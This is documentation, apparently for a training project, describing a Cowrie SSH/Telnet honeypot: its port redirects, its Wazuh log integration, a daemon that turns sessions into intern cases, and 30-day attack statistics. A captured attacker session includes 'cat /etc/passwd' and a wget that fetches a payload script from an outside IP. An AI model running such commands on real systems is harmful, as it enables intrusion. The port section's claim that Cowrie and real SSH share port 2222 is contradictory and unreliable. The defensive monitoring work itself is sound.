# 03 — Cowrie Honeypot

## Version

Cowrie 2.9.17

## What Cowrie Does

Cowrie is a medium-to-high interaction SSH and Telnet honeypot. It presents a fake shell to attackers, logs every credential they attempt, every command they run, every file they try to download, and every action they take — all without giving them access to any real system.

From the attacker's perspective they have successfully logged in and are running commands on a Linux server. In reality they are in a completely isolated fake environment and everything they do is being logged.

## Port Configuration

| External Port | Redirect | Cowrie Listening Port | Protocol |
|---|---|---|---|
| 22 | iptables PREROUTING | 2222 | SSH |
| 23 | iptables PREROUTING | 2225 | Telnet |

Real SSH for administration runs on port 2222 — the same port Cowrie receives redirected traffic on. This works because Cowrie binds to the internal redirect port and real SSH is accessed directly via the known port from authorised IPs only.

## Log Location

```
/home/cowrie/cowrie/var/log/cowrie/cowrie.json
```

This JSON log is monitored by Wazuh in real time.

## Sample Attacker Session (Real)

```json
{"eventid":"cowrie.session.connect","src_ip":"114.220.238.224","src_port":51767}
{"eventid":"cowrie.login.failed","username":"gituser","password":"gituser123"}
{"eventid":"cowrie.login.failed","username":"ricardo","password":"password"}
{"eventid":"cowrie.login.success","username":"tauro","password":"tauro"}
{"eventid":"cowrie.command.input","input":"whoami"}
{"eventid":"cowrie.command.input","input":"cat /etc/passwd"}
{"eventid":"cowrie.command.input","input":"wget http://91.92.255.147/payload.sh"}
{"eventid":"cowrie.session.closed","duration":847.3}
```

This is a real session captured from a Chinese IP (Jiangsu Province) — MITRE ATT&CK T1110 Brute Force.

## Integration with Wazuh

Wazuh reads the Cowrie JSON log via localfile configuration in `ossec.conf`:

```xml
<localfile>
  <log_format>json</log_format>
  <location>/home/cowrie/cowrie/var/log/cowrie/cowrie.json</location>
</localfile>
```

Custom Wazuh rules (200001–200008) parse Cowrie events and create structured alerts.

## Integration with Case Management System

A Python daemon monitors the Cowrie log and automatically creates investigation cases when attacker sessions close:

- Session closes → daemon detects new `cowrie.session.closed` event
- Case created in LearnCyber Case Management System with full session details
- Mentor notification email sent
- Wazuh-Convex integration routes enriched alert to intern dashboard

Time from session close to intern notification: under 30 seconds.

## Live Statistics (First 30 Days)

| Metric | Value |
|--------|-------|
| Total sessions | 5,639 |
| Unique attacking IPs | 1,847 |
| Most common username tried | root |
| Top attacking country | China |
| Longest session | 14 minutes 23 seconds |
| Commands executed (total) | 23,441 |
